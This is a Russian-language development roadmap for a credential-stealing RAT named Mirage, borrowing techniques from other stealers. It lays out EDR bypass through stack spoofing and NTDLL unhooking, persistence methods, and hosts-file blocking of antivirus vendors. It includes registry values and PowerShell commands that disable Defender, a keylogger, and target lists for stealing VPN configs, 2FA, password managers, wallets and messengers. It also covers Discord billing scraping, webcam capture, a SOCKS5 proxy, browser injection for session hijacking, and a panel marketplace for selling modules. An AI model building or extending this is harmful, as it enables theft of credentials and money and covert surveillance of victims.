# Phase 16: RAT & Stealer Integration — From Overlord, Intelix, LegionStealerStub

**Цель:** Интегрировать лучшие техники из Overlord (RAT), Intelix (stealer), LegionStealerStub (stealer) в Mirage.
**Всего задач:** 38 | **Оценка:** ~25 дней | **Сложность:** Высокая

---

## Dependency Map

```
Phase 16
│
├── 16.1 Stealer Engine — EDR/AV Bypass (7 задач, ~5 дней)
│   ├── 16.1.1 Stack Spoofing
│   ├── 16.1.2 Persistence Multi-Method (4 метода)
│   ├── 16.1.3 Hosts File Poisoning
│   ├── 16.1.4 Windows Defender Disable
│   ├── 16.1.5 Anti-VM: Hosting IP check
│   ├── 16.1.6 NTDLL Unhook
│   └── 16.1.7 Keylogger (WH_KEYBOARD_LL)
│
├── 16.2 Coverage Expansion — из Intelix (11 задач, ~7 дней)
│   ├── 16.2.1 VPN clients (18)
│   ├── 16.2.2 2FA Authenticators (7)
│   ├── 16.2.3 Password Managers (8)
│   ├── 16.2.4 Seed Phrase Grabber
│   ├── 16.2.5 Yandex Passman
│   ├── 16.2.6 App-Bound v20 Flags 1-3 (CNG fallback)
│   ├── 16.2.7 Discord billing/gifts scraping
│   ├── 16.2.8 Webcam Capture
│   ├── 16.2.9 Desktop wallets expansion: +23 (→33 total)
│   ├── 16.2.10 Extension wallets expansion: +14 (→76 total)
│   └── 16.2.11 Messengers expansion: +8 (→12 total)
│
├── 16.3 RAT Capabilities — из Overlord (5 задач, ~10 дней)
│   ├── 16.3.1 Reverse Proxy (SOCKS5)
│   ├── 16.3.2 Chrome Backstage Injection
│   ├── 16.3.3 Multi-Platform Build (Linux/macOS)
│   ├── 16.3.4 Self-Supersede / Agent Update
│   └── 16.3.5 WASM Plugin Runtime
│
└── 16.4 Panel Improvements — из nexus-stealer + Overlord (8 задач, ~5 дней)
    ├── 16.4.1 TOTP 2FA Authentication
    ├── 16.4.2 IP Security Scoring
    ├── 16.4.3 In-Panel Documentation
    ├── 16.4.4 Community Chat + Support Tickets
    ├── 16.4.5 Marketplace / Module Store
    ├── 16.4.6 Session Management (device tracking + remote terminate)
    ├── 16.4.7 Public Statistics Page
    └── 16.4.8 API Key Management
```

---

## 16.1 Stealer Engine — EDR/AV Bypass (7 задач, ~5 дней)

### 16.1.1 Stack Spoofing (2-3 дня)

**Источник:** Overlord (garble controlflow), STORM benchmark, TheVoid

**Что делаем:** Подмена Return Address на стеке перед syscall для обхода EDR stack tracing (CrowdStrike Falcon, SentinelOne).

**Алгоритм:**
```
1. Сисколл получает управление из Zig wrapper
2. Сохранить оригинальный RSP/RBP
3. Создать теневой стек (NtAllocateVirtualMemory)
4. Заполнить теневой стек:
   - fake_ret_addr = gadget_pool[random_index]  // адрес syscall;ret из ntdll
   - fake_rbp = теневой_стек + смещение
5. mov rsp, теневой_стек
6. push fake_ret_addr  // подмена return address
7. syscall              // через гаджет
8. Восстановить RSP/RBP
9. Вернуть результат
```

**Overlord reference:** `garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2` — Go-level control flow flattening

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/syscalls/stack_spoof.zig` | 🆕 Новый — RSP shifting, fake stack, gadget integration |
| `src/syscalls/stubs.zig` | ✏️ Модифицировать — каждый stub вызывает stack_spoof |
| `src/syscalls/gadget.zig` | ✏️ Расширить — добавить выбор гаджета для spoofing |

**Тестирование:**
- Unit: stack\_spoof выделяет теневой стек, корректно восстанавливает RSP
- Integration: syscall через spoofed stack возвращает правильный NTSTATUS
- EDR test: запустить под CrowdStrike/SentinelOne — проверить что не детектится

**Критерий приёмки:**
- Все 30 сисколлов работают через stack spoofing
- Zero дополнительных детектов на VirusTotal
- Отсутствие крашей при повторных вызовах

---

### 16.1.2 Persistence Multi-Method (4 метода, 2-3 дня)

**Источник:** Overlord `cmd/agent/persistence/persistence_windows_*.go`

**Что делаем:** Вместо одного Run key — цепочка методов с fallback.

**Методы (в порядке приоритета):**

| Level | Метод | Файл в Overlord | Техника |
|-------|-------|-----------------|---------|
| 1 | Registry Run Key | `persistence_windows_registry.go` | HKCU\Software\Microsoft\Windows\CurrentVersion\Run |
| 2 | Task Scheduler | `persistence_windows_taskscheduler.go` | schtasks.exe /create /tn "..." /tr "..." /sc onlogon |
| 3 | Startup Folder | `persistence_windows_startup.go` | %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup |
| 4 | WMI Event Subscription | `persistence_windows_wmi.go` | __EventFilter + CommandLineEventConsumer |

**Архитектура (как в Overlord):**
```zig
// src/cleanup/persistence.zig
var persist_fns: []const fn(path: []const u8) bool = &.{};
var uninstall_fns: []const fn() bool = &.{};

pub fn install(path: []const u8) bool {
    for (persist_fns) |fn| {
        if (fn(path)) return true;  // first success wins
    }
    return false;
}

pub fn uninstall() bool {
    for (uninstall_fns) |fn| { _ = fn(); }
}
```

**Self-remove (supersede):**
```zig
pub fn removeCurrentInstall(exe_path: []const u8) bool {
    // 1. NtSetInformationFile(FileDispositionInformation) — Win11 24H2
    // 2. MoveFileEx(MOVEFILE_DELAY_UNTIL_REBOOT) — Win10 fallback
    // 3. cmd /c ping + del — универсальный fallback
}
```
**Reference:** Overlord `supersede.go`

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/cleanup/persistence.zig` | 🆕 Новый — точка входа, цепочка методов |
| `src/cleanup/persistence_registry.zig` | 🆕 Новый — Registry Run Key |
| `src/cleanup/persistence_scheduler.zig` | 🆕 Новый — Task Scheduler |
| `src/cleanup/persistence_startup.zig` | 🆕 Новый — Startup Folder |
| `src/cleanup/persistence_wmi.zig` | 🆕 Новый — WMI Event Subscription |
| `src/cleanup/supersede.zig` | 🆕 Новый — Self-remove при обновлении |

**Тестирование:**
- Unit: каждый метод устанавливает/удаляет корректно
- Integration: цепочка методов отрабатывает без дублирования
- Cleanup: uninstall удаляет все установленные методы

---

### 16.1.3 Hosts File Poisoning (0.5 дня)

**Источник:** LegionStealerStub `legionantiprocesses/antiprocessorman.cs`, `Program.cs:464-511`

**Что делаем:** Блокировка телеметрии AV через hosts файл.

**Список доменов (LegionStealerStub — 29 доменов):**
```
0.0.0.0 *.microsoft.com
0.0.0.0 *.threatconnect.microsoft.com
0.0.0.0 *.kaspersky.*
0.0.0.0 *.eset.*
0.0.0.0 *.drweb.*
0.0.0.0 *.avast.*
0.0.0.0 *.avg.*
0.0.0.0 *.bitdefender.*
0.0.0.0 *.malwarebytes.*
0.0.0.0 *.crowdstrike.*
0.0.0.0 *.sentinelone.*
0.0.0.0 *.trendmicro.*
0.0.0.0 *.mcafee.*
0.0.0.0 *.sophos.*
0.0.0.0 *.norton.*
0.0.0.0 *.panda.*
0.0.0.0 *.f-secure.*
0.0.0.0 *.comodo.*
0.0.0.0 *.checkpoint.*
0.0.0.0 *.fortinet.*
0.0.0.0 *.paloaltonetworks.*
0.0.0.0 *.broadcom.*
0.0.0.0 *.vmware.*
0.0.0.0 *.carbonblack.*
0.0.0.0 *.cylance.*
0.0.0.0 *.fireeye.*
0.0.0.0 *.zonelabs.*
0.0.0.0 *.gdata.*
0.0.0.0 *.ahnlab.*
```

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/evasion/hosts_poison.zig` | 🆕 Новый |

**Тестирование:**
- Проверить что hosts файл содержит добавленные записи
- Проверить что очистка восстанавливает оригинал

---

### 16.1.4 Windows Defender Disable (0.5 дня)

**Источник:** LegionStealerStub `Disable_Windows_Defender/LOLDISBALEWINDOW.cs`

**Registry:**
```
HKLM\SOFTWARE\Microsoft\Windows Defender\DisableAntiSpyware = 1
HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 1
HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring = 1
HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableIOAVProtection = 1
HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableScriptScanning = 1
HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet\DisableBlockAtFirstSeen = 1
HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0
```

**PowerShell fallback:**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true -DisableScriptScanning $true
Set-MpPreference -DisableBlockAtFirstSeen $true -PUAProtection 0
```

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/evasion/defender_disable.zig` | 🆕 Новый |

**Тестирование:**
- Проверить registry ключи после выполнения
- PowerShell команды корректно выполняются (или silent fail)

---

### 16.1.5 Anti-VM: Hosting IP Check (0.5 дня)

**Источник:** LegionStealerStub `legion.payload.Components.AntiVM/Detector.cs:107-118`

```zig
// Сделать HTTP GET запрос к ip-api.com/line/?fields=hosting
// Если hosting == true → +15 к evasion score
```

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/evasion/evasion.zig` | ✏️ Добавить checkHostingIP() |

---

### 16.1.6 NTDLL Unhook (2 дня)

**Источник:** STORM (FreshyCalls), Overlord (косвенно)

**Алгоритм:**
```
1. Открыть %SystemRoot%\System32\ntdll.dll как файл (NtCreateFile)
2. Создать секцию (NtCreateSection)
3. Замапить как IMAGE_MAPPED (NtMapViewOfSection)
4. Найти .text секцию в чистой копии
5. Перезаписать hooked .text в текущем процессе
6. NtFlushInstructionCache
```

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/syscalls/ntdll_unhook.zig` | 🆕 Новый |

---

### 16.1.7 Keylogger (WH_KEYBOARD_LL) (2 дня)

**Источник:** Overlord `privacy/privacy_windows.go`, XWorm `Keylogger.cs`, LegionStealerStub

**Overlord реализация:**
- `SetWindowsHookEx(WH_KEYBOARD_LL)` — low-level keyboard hook
- Свой thread с message pump (GetMessage → TranslateMessage → DispatchMessage)
- Input marker: dwExtraInfo = 0x00D5E7B00B5 для различения своего ввода
- Блокировка Ctrl+P, скриншотов (Ctrl+Shift+S)
- Интеграция с Privacy Mode (SetWindowDisplayAffinity)

**Для Mirage (Zig):**
```zig
// src/evasion/keylogger.zig
// user32.dll resolved через PEB + hash
// SetWindowsHookEx через hash-resolved API
// Кольцевой буфер на 64KB
// Отправка вместе с report.txt
```

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/evasion/keylogger.zig` | 🆕 Новый — WH_KEYBOARD_LL hook + message loop |
| `src/config/config.zig` | ✏️ Добавить ENABLE_KEYLOGGER флаг |

**Тестирование:**
- Запустить, нажать несколько клавиш — проверить лог
- Проверить что hook не вызывает крашей
- Проверить что лог отправляется с отчётом

---

## 16.2 Coverage Expansion — из Intelix (11 задач, ~7 дней)

### 16.2.1 VPN Clients (18, 2 дня)

**Источник:** Intelix `Intelix.Targets.Vpn/*.cs`

**Метод:** Копирование конфигов по стандартным путям.

| # | VPN | Path | Files |
|---|-----|------|-------|
| 1 | NordVPN | `%LOCALAPPDATA%\NordVPN\NordVpn.exe*\*\user.config` | DPAPI-encrypted credentials |
| 2 | OpenVPN | `%APPDATA%\OpenVPN Connect\profiles\*.ovpn` | Connection profiles |
| 3 | ProtonVPN | `%APPDATA%\ProtonVPN\*\user.config` | Auth config |
| 4 | WireGuard | `%APPDATA%\WireGuard\Configurations\*.conf` | Tunnel configs |
| 5 | SurfShark | `%APPDATA%\Surfshark\*\Local Storage\leveldb` | LevelDB tokens |
| 6 | ExpressVPN | `%APPDATA%\ExpressVPN\*\config\*.ovpn` | VPN configs |
| 7 | CyberGhost | `%APPDATA%\CyberGhost\*\*.json` | Settings |
| 8 | PIA VPN | `%APPDATA%\Private Internet Access\*\*.json` | Auth data |
| 9 | Mullvad | `%APPDATA%\Mullvad VPN\*\account-history.json` | Account tokens |
| 10 | Windscribe | `%APPDATA%\Windscribe\Windscribe\config\*.cfg` | Config |
| 11 | TunnelBear | `%APPDATA%\TunnelBear\*\Local Storage\leveldb` | LevelDB |
| 12 | Hotspot Shield | `%APPDATA%\Hotspot Shield\*\*.cfg` | Config |
| 13 | VyprVPN | `%APPDATA%\VyprVPN\*\*.dat` | Data files |
| 14 | Hamachi | `%APPDATA%\Hamachi\*.conf` | Config |
| 15 | HideMyName | `%APPDATA%\Hide My Name\*\*.xml` | Profiles |
| 16 | IpVanish | `%APPDATA%\IPVanish\*\*.dat` | Data |
| 17 | RadminVPN | `%APPDATA%\Radmin VPN\*\Radmin VPN.xml` | Config |
| 18 | SoftEther | `%APPDATA%\SoftEther VPN Client\*\*.config` | Connection config |

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/vpn/vpn.zig` | 🆕 Новый — orchestrator |
| `src/vpn/nord.zig` | 🆕 Новый |
| `src/vpn/openvpn.zig` | 🆕 Новый |
| `src/vpn/wireguard.zig` | 🆕 Новый |
| `src/vpn/surfshark.zig` | 🆕 Новый |
| `src/vpn/express.zig` | 🆕 Новый |
| `src/vpn/cyberghost.zig` | 🆕 Новый |
| `src/vpn/pia.zig` | 🆕 Новый |
| `src/vpn/mullvad.zig` | 🆕 Новый |
| `src/vpn/windscribe.zig` | 🆕 Новый |
| `src/vpn/tunnelbear.zig` | 🆕 Новый |
| `src/vpn/hotspot.zig` | 🆕 Новый |
| `src/vpn/vypr.zig` | 🆕 Новый |
| `src/vpn/hamachi.zig` | 🆕 Новый |
| `src/vpn/hidemy.zig` | 🆕 Новый |
| `src/vpn/ipvanish.zig` | 🆕 Новый |
| `src/vpn/radmin.zig` | 🆕 Новый |
| `src/vpn/softether.zig` | 🆕 Новый |

**Тестирование:**
- Каждый модуль: проверить копирование файлов
- Интеграция: orchestrator собирает все VPN данные в отчёт

---

### 16.2.2 2FA Authenticators (7, 1 день)

**Источник:** Intelix `Intelix.Targets.Browsers\CryptoChromium.cs` (76 extension IDs, включая 7 2FA + 8 PM)

**Extension IDs для 2FA:**
| # | 2FA App | Extension ID |
|---|---------|-------------|
| 1 | Google Authenticator | `khcodhlfkpmhibicdjjblnkgimdepgnd` |
| 2 | Microsoft Authenticator | `bfbdnbpibgndpjfhonkflpkijfapmomn` |
| 3 | Authy | `gjffdbjndmcafeoehgdldobgjmlepcal` |
| 4 | Duo Mobile | `eidlicjlkaiefdbgmdepmmicpbggmhoj` |
| 5 | OTP Auth | `bobfejfdlhnabgglompioclndjejolch` |
| 6 | FreeOTP | `elokfmmmjbadpgdjmgglocapdckdcpkn` |
| 7 | Aegis Authenticator | `bhghoamapcdpbohphigoooaddinpkbai` |

**Метод:** Копирование `Local Extension Settings/<id>/` LevelDB директории (как wallet extensions).

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/wallets/2fa_extensions.zig` | 🆕 Новый |

---

### 16.2.3 Password Managers (8, 1 день)

**Источник:** Intelix (8 PM extension IDs)

| # | Password Manager | Extension ID |
|---|-----------------|-------------|
| 1 | Bitwarden | `nngceckbapebfimnlniiiaiaopbngkcc` |
| 2 | Dashlane | `fdjamakpfbbddfjaooikfcpapjohcfmg` |
| 3 | Keeper | `bfogiafebfohielmfpndgfnnblcidlfn` |
| 4 | KeePassXC | `oboonakemofpalcgghocfoadofidhfkk` |
| 5 | LastPass | `hdokiejnpimakedhajhdlcegeplioahd` |
| 6 | NordPass | `fjohedfmdkclgkjgbmaadibebkbnagoo` |
| 7 | RoboForm | `pnlccmojcmeohlpggmfnbbiapkmbliob` |
| 8 | 1Password | `aeblfdkhhhdcdjpifhhbdioieplbjndc` |

**Метод:** Копирование `Local Extension Settings/<id>/` LevelDB.

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/wallets/pm_extensions.zig` | 🆕 Новый |

---

### 16.2.4 Seed Phrase Grabber (1-2 дня)

**Источник:** Intelix `Intelix.Targets.Crypto\Grabber.cs`

**Пути сканирования:**
```
Desktop, Documents, Downloads
OneDrive\*, Dropbox\*, iCloudDrive\*, Google Drive\*, YandexDisk\*, Mega\*
Evernote\*, Standard Notes\*, Joplin\*
Wallets\, Keys\, Crypto\, Backup\
```

**Маски файлов:** `.seed`, `.seedphrase`, `.mnemonic`, `.phrase`, `.key`, `.secret`, `.txt`, `.backup`, `.wallet`

**Сканирование:** Поиск 12/15/18/21/24 слов BIP39 подряд.

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/system/seed_grabber.zig` | 🆕 Новый |

---

### 16.2.5 Yandex Passman (1 день)

**Источник:** Intelix `Intelix.Helper.Encrypted\LocalEncryptor.cs`

**Метод:**
1. Открыть `Ya Passman Data` SQLite в профиле Яндекс.Браузера
2. Извлечь `local_encryptor_data` из таблицы logins
3. Распарсить `"v10"` префикс + nonce(12) + ciphertext + tag(16)
4. Расшифровать AES-GCM мастер-ключом браузера
5. Извлечь `encryption_key` (32 байта)

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/browsers/yandex_passman.zig` | 🆕 Новый |

---

### 16.2.6 App-Bound v20 Flags 1-3 (CNG Fallback, 1 день)

**Источник:** Intelix `Intelix.Helper.Encrypted\LocalState.cs:108-162`, `CngDecryptor.cs`

**Intelix поддерживает 3 флага App-Bound, Mirage — только COM Elevator:**

| Flag | Метод | Когда нужен |
|------|-------|-------------|
| 1 | AES-GCM с hardcoded ключом | Chrome 110-120 |
| 2 | ChaCha20-Poly1305 с hardcoded ключом | Chrome 120-130 |
| 3 | CNG NCryptDecrypt + Google Chromekey1 | Chrome 130+ |

**Добавить:** Flags 1-3 как fallback, если COM Elevator injection не удался.

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/crypto/chrome_key.zig` | ✏️ Добавить App-Bound Flags 1-3 |

---

### 16.2.7 Discord Billing/Gifts Scraping (1 день)

**Источник:** LegionStealerStub `legion.payload.Components.Messenger.Discord\TokenStealer.cs:321-363`

**После получения Discord токена:**
```http
GET https://discord.com/api/v9/users/@me/billing/payment-sources
Authorization: <token>
→ возвращает карты/PayPal

GET https://discord.com/api/v9/users/@me/outbound-promotions/codes
Authorization: <token>
→ возвращает Nitro gift коды
```

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/messengers/discord.zig` | ✏️ Добавить billing + gifts scraping |

---

### 16.2.8 Webcam Capture (1-2 дня)

**Источник:** LegionStealerStub `legion.payload.Webcam\ImageCapture.cs`, XWorm `WebCam.cs`

**Метод 1 — AVICAP32 (проще):**
```zig
// capCreateCaptureWindowW → WM_CAP_DRIVER_CONNECT → WM_CAP_EDIT_COPY
// OpenClipboard → GetClipboardData → Save as BMP
```

**Метод 2 — DirectShow COM (LegionStealerStub):**
- COM interop через ICreateDevEnum
- Enumerate Monikers
- IBaseFilter → ISampleGrabber → GetBitmap

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/system/webcam.zig` | 🆕 Новый |

---

### 16.2.9 Desktop Wallets Expansion (+23 → 33 total, 1 день)

**Источник:** Intelix `Intelix.Targets.Crypto\CryptoDesktop.cs:12-189`

**Добавить из Intelix:**
| # | Wallet | Path |
|---|--------|------|
| 1 | Armory | `%APPDATA%\Armory` |
| 2 | Bytecoin | `%APPDATA%\Bytecoin` |
| 3 | Jaxx | `%APPDATA%\com.liberty.jaxx\IndexedDB\file_0.indexeddb.leveldb` |
| 4 | Ethereum | `%APPDATA%\Ethereum\keystore` |
| 5 | Binance | `%APPDATA%\Binance\*\Local Storage\leveldb` |
| 6 | Ledger Live | `%APPDATA%\Ledger Live\` |
| 7 | Trezor Suite | `%APPDATA%\Trezor Suite\` |
| 8 | MyEtherWallet | `%APPDATA%\MyEtherWallet\` |
| 9 | MyCrypto | `%APPDATA%\MyCrypto\` |
| 10 | MetaMask (desktop) | `%APPDATA%\MetaMask\` |
| 11 | TrustWallet (desktop) | `%APPDATA%\TrustWallet\` |
| 12 | Bitcoin Core | Registry + `%APPDATA%\Bitcoin\` |
| 13 | Litecoin Core | Registry + `%APPDATA%\Litecoin\` |
| 14 | Dash Core | Registry + `%APPDATA%\Dash\` |
| 15 | Bitcoin Gold | Registry + `%APPDATA%\BitcoinGold\` |
| 16 | Vertcoin | Registry + `%APPDATA%\Vertcoin\` |
| 17 | Groestlcoin | Registry + `%APPDATA%\Groestlcoin\` |
| 18 | Komodo | Registry + `%APPDATA%\Komodo\` |
| 19 | PIVX | Registry + `%APPDATA%\PIVX\` |
| 20 | MyMonero | `%APPDATA%\MyMonero\` |
| 21 | Monero (CLI) | `%APPDATA%\monero-project\monero-core\wallets` |
| 22 | Electrum-LTC | `%APPDATA%\Electrum-LTC\wallets` |
| 23 | Bitcoin (AppData) | `%LOCALAPPDATA%\Bitcoin\wallets` |

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/wallets/wallet_desktop.zig` | ✏️ Добавить 23 новых пути |

---

### 16.2.10 Extension Wallets Expansion (+14 → 76 total, 0.5 дня)

**Источник:** Intelix `Intelix.Targets.Browsers\CryptoChromium.cs:11-116`

**Добавить extension IDs из Intelix (которых нет в Mirage):**
```
pknlccmneadmjbkollckpblgaaabameg  — Trust Wallets
pfknkoocfefiocadajpngdknmkjgakdg  — MetaWallet
idkppnahnmmggbmfkjhiakkbkdpnmnon  — Exodus
mhonjhhcgphdphdjcdoeodfdliikapmj  — JaxxxLiberty
bhmlbgebokamljgnceonbncdofmmkedg  — Atomic Wallet
pidhddgciaponoajdngciemcflpnnbg   — Mycelium
gflpckpfdgcagnbdfafmibcmkadnlhpj  — GreenAddress
doljkehcfhidippihgakcihcmnknlphh  — Edge
ieedgmmkpkbiblijbbldefkomatsuahh  — Copay
jifanbgejlbcmhbbdbnfbfnlmbomjedj  — Bread
dojmlmceifkfgkgeejemfciibjehhdcl  — KeepKey
jpxupxjxheguvfyhfhahqvxvyqthiryh  — Trezor
pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln  — Ledger Live
hbpfjlflhnmkddbjdchbbifhllgmmhnm  — Ledger Wallet
```

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/wallets/wallet_extensions.zig` | ✏️ Добавить 14 новых ID |

---

### 16.2.11 Messengers Expansion (+8 → 12 total, 2 дня)

**Источник:** Intelix `Intelix.Targets.Messangers/*.cs`

**Добавить:**
| # | Messenger | Path | Method |
|---|-----------|------|--------|
| 1 | Element | `%APPDATA%\Element\` | Copy config + session |
| 2 | ICQ | `%APPDATA%\ICQ\0001\` | Copy data |
| 3 | MicroSIP | `%APPDATA%\MicroSIP\` | Copy config |
| 4 | Jabber | `%APPDATA%\Jabber\` | Copy config |
| 5 | Outlook (classic) | Registry + DPAPI | Decrypt POP3/IMAP/SMTP passwords |
| 6 | Skype | `%APPDATA%\Skype\` | Copy config |
| 7 | Tox | `%APPDATA%\Tox\` | Copy profile |
| 8 | Viber | `%APPDATA%\Viber\` | Copy data |

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/messengers/element.zig` | 🆕 Новый |
| `src/messengers/icq.zig` | 🆕 Новый |
| `src/messengers/microsip.zig` | 🆕 Новый |
| `src/messengers/jabber.zig` | 🆕 Новый |
| `src/messengers/outlook.zig` | 🆕 Новый |
| `src/messengers/skype.zig` | 🆕 Новый |
| `src/messengers/tox.zig` | 🆕 Новый |
| `src/messengers/viber.zig` | 🆕 Новый |

---

## 16.3 RAT Capabilities — из Overlord (5 задач, ~10 дней)

### 16.3.1 Reverse Proxy (SOCKS5, 3-5 дней)

**Источник:** Overlord `cmd/agent/handlers/command.go` (SOCKS5), NyashRat, SRC

**Что делаем:** SOCKS5 прокси-сервер внутри стилера, управляемый через Panel.

**Архитектура:**
```
Client → SOCKS5 CONNECT → Mirage (прокси) → Target Server
                           ↑
                    Panel управляет:
                    - start/stop proxy
                    - whitelist targets
                    - rate limit
```

**SOCKS5 протокол:**
```
Client → Mirage:  | version=5 | nmethods=1 | method=0 (no auth) |
Mirage → Client: | version=5 | method=0 |
Client → Mirage: | version=5 | cmd=1(CONNECT) | rsv=0 | atyp=3(domain) | len | domain | port |
Mirage → Client: | version=5 | rep=0(success) | ... |
Mirage → Target: TCP connect → pipe data
```

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/network/socks5.zig` | 🆕 Новый — SOCKS5 сервер |
| `src/network/panel_http.zig` | ✏️ Добавить команды управления прокси |
| `Mirage.Panel/internal/api/router.go` | ✏️ Добавить API endpoints для прокси |

**Тестирование:**
- SOCKS5 CONNECT к целевому хосту работает
- Несколько одновременных соединений
- Ограничение по white/black list
- curl --socks5 через Mirage работает

---

### 16.3.2 Chrome Backstage Injection (5-7 дней)

**Источник:** Overlord `cmd/agent/capture/backstage_inject_windows.go`

**Что делаем:** DLL инжект в процесс браузера для захвата живого экрана.

**Алгоритм (из Overlord):**
```
1. Найти браузер (Chrome/Edge/Brave/Yandex)
2. Прочитать browserInfoMap: exe, userDataDir, profile structure
3. Клонировать профиль браузера:
   - Lite clone: skip extensions, only cookies + login state
   - Full clone: всё
4. Запустить браузер с клонированным профилем (suspended)
5. Инжектировать capture DLL через CreateRemoteThread + LoadLibrary
6. GPU inject: найти GPU child process → инжект туда
7. DXGI Desktop Duplication → H.264 → Named pipe → стилер
```

**Зачем:**
- Просмотр живого экрана браузера жертвы через Panel
- Работа с сайтами через браузер жертвы (Session Hijacking, 2FA bypass)
- Доступ к корпоративным порталам через Device-Based Conditional Access

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/inject/backstage.zig` | 🆕 Новый |
| `src/inject/backstage_browsers.zig` | 🆕 Новый — browserInfoMap + profile clone |
| `src/inject/dll_loader.zig` | ✏️ Расширить для инжекта в чужие процессы |

**Тестирование:**
- Инжект в Chrome/Edge/Brave работает
- Захват DXGI возвращает кадры
- Named pipe передаёт данные

---

### 16.3.3 Multi-Platform Build (Linux/macOS, недели)

**Источник:** Overlord (Go conditional tags, 3 платформы)

**Overlord:**
```go
//go:build windows
//go:build linux
//go:build darwin
```

**Zig target:** Поддерживает `x86_64-linux`, `x86_64-macos`, `aarch64-macos`

**Что нужно разделить:**
```zig
// src/syscalls/platform.zig
pub const Platform = enum { windows, linux, macos };

// Windows-specific: Halo's Gate, PE parsers, registry, COM
// Linux-specific: ptrace, /proc/\*, D-Bus
// macOS-specific: Keychain, .db files in ~/Library/
```

**План:**
1. Выделить платформозависимый код в отдельные файлы
2. Создать platform detection через `@import("builtin").os.tag`
3. Linux: сбор через `std.fs` вместо NtCreateFile
4. macOS: сбор Keychain через CLI `security`, .db из `~/Library/Application Support/`

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/platform/` | 🆕 Новая директория |
| `src/platform/windows.zig` | 🆕 Windows API bridge |
| `src/platform/linux.zig` | 🆕 Linux API bridge |
| `src/platform/macos.zig` | 🆕 macOS API bridge |

**Сложность:** Высокая (недели) — P3

---

### 16.3.4 Self-Supersede / Agent Update (1-2 дня)

**Источник:** Overlord `cmd/agent/handlers/agent_update.go`, `cmd/agent/supersede.go`

**Overlord:**
1. Download new binary from C2
2. Rename old → `old.exe.migrate`
3. Write new to target path
4. Persistence.Configure(new_path) — re-register all methods
5. Start new process
6. Exit (old process terminates)
7. New process deletes `old.exe.migrate` on startup

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/cleanup/self_update.zig` | 🆕 Новый |

---

### 16.3.5 WASM Plugin Runtime (3-5 дней)

**Источник:** Overlord `cmd/agent/plugins/` (wazero — Go WASM runtime)

**Overlord загружает WASM плагины с сервера и выполняет их в sandbox.**

**Для Zig:** Использовать `wasmtime` или `wasmer` C API, или написать минимальный WASM runtime.

**Применение:**
- Загрузка новых collector модулей без обновления бинарника
- Кастомные file grabber правила
- Расширение coverage без пересборки

**Файлы:**
| Файл | Действие |
|------|----------|
| `src/plugins/` | 🆕 Новая директория |
| `src/plugins/wasm.zig` | 🆕 Новый — WASM loader + runtime |

**Сложность:** Высокая — P4

---

## 16.4 Panel Improvements (8 задач, ~5 дней)

### 16.4.1 TOTP 2FA Authentication (1 день)

**Источник:** nexus-stealer (`backend/api/views.py:216-344`, `AccountPanel.tsx:98-277`)

**Go реализация:**
```go
// Использовать github.com/pquerna/otp/totp
secret, _ := totp.Generate(...)
qr, _ := secret.Image(200, 200)
// При логине: totp.Validate(passcode, secret.Secret())
```

**API:**
- `POST /api/auth/2fa/setup` — получить QR + secret
- `POST /api/auth/2fa/verify` — проверить код, включить 2FA
- `POST /api/auth/2fa/disable` — отключить 2FA (требует пароль)

**Файлы:**
| Файл | Действие |
|------|----------|
| `Mirage.Panel/internal/auth/2fa.go` | 🆕 Новый |

---

### 16.4.2 IP Security Scoring (1 день)

**Источник:** nexus-stealer `backend/api/views.py:1046-1162`

**Multi-API проверка IP перед логином:**
```go
// 1. ip-api.com — страна, ISP, hosting/proxy
// 2. ipapi.co — threat score
// 3. proxycheck.io — VPN/Proxy detection
//
// Scoring:
//   hosting=true → +30
//   proxy=true → +50
//   country=CIS → +10
//   threat_score>50 → +40
//   score>60 → require 2FA or block
```

**Файлы:**
| Файл | Действие |
|------|----------|
| `Mirage.Panel/internal/middleware/ipscore.go` | 🆕 Новый |

---

### 16.4.3 In-Panel Documentation (1 день)

**Источник:** nexus-stealer `DocsView.tsx:1-566`

**Добавить в фронтенд:**
- Страница `/docs` с полной документацией
- Содержание из `docs/ARCHITECTURE.md`, `docs/OPSEC.md`, `docs/plans/*.md`
- Search по документации
- Video guides (YouTube embed)

---

### 16.4.4 Community Chat + Support Tickets (3-5 дней)

**Источник:** nexus-stealer `ChatRoom.tsx:1-543`

**WebSocket чат:**
- Система сообщений с эмодзи, GIF (Tenor API), @mentions
- Reply threading
- Slow mode (admin configurable)
- Support tickets с категориями

**Backend:**
```go
// internal/ws/chat.go
// Использовать существующий WebSocket хаб
// Таблицы: chat_messages, chat_rooms, support_tickets
```

---

### 16.4.5 Marketplace / Module Store (2-3 дня)

**Источник:** nexus-stealer `ShopView.tsx:1-54`, `PremiumModules.tsx:1-74`

**Внутренний маркетплейс:**
- Список premium модулей с ценами
- License key validation для покупки
- Автоматическая разблокировка после покупки
- Интеграция с Telegram ботом для продаж

